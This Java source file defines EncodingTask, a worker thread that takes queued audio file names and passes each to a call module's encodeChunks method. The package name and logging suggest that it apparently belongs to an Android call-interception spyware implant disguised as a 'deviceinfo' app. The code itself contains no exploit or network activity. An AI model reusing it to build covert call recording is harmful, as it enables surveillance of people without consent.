package com.android.deviceinfo.module.call;

import java.util.concurrent.BlockingQueue;

import com.android.deviceinfo.ProcessInfo;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.interfaces.Observer;
import com.android.deviceinfo.listener.ListenerProcess;
import com.android.deviceinfo.module.ModuleCall;
import com.android.deviceinfo.util.Check;

public class EncodingTask implements Runnable, Observer<ProcessInfo> {
	/**
	 * 
	 */
	private static final String TAG = "EncodingTask";
	
	private final ModuleCall moduleCall;
	Object sync;
	BlockingQueue<String> queue;
	boolean stopQueueMonitor;

	public EncodingTask(ModuleCall moduleCall, Object t, BlockingQueue<String> l) {
		this.moduleCall = moduleCall;
		sync = t;
		queue = l;
		ListenerProcess.self().attach(this);
	}

	public void stop() {
		stopQueueMonitor = true;
		ListenerProcess.self().detach(this);
		wake();

	}

	public void wake() {
		synchronized (sync) {
			sync.notify();
		}
	}

	public void run() {
		while (true) {
			synchronized (sync) {
				try {
					sync.wait();
				} catch (InterruptedException e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}
				}
			}

			if (stopQueueMonitor) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(EncodingTask run): killing audio encoding thread");

				}
				return;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + "(EncodingTask run): thread awoken, time to encode");
			}

			// Browse lists and check if an encoding is already in
			// progress
			try {
				while (queue.isEmpty() == false) {
					String file = queue.take();

					// Check if end of conversation
					if (Cfg.DEBUG) {
						Check.log(TAG + "(EncodingTask run): decoding " + file);
					}

					this.moduleCall.encodeChunks(file);

				}
			} catch (Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}
			}

		}
	}

	@Override
	public int notification(ProcessInfo b) {
		return 0;
	}
}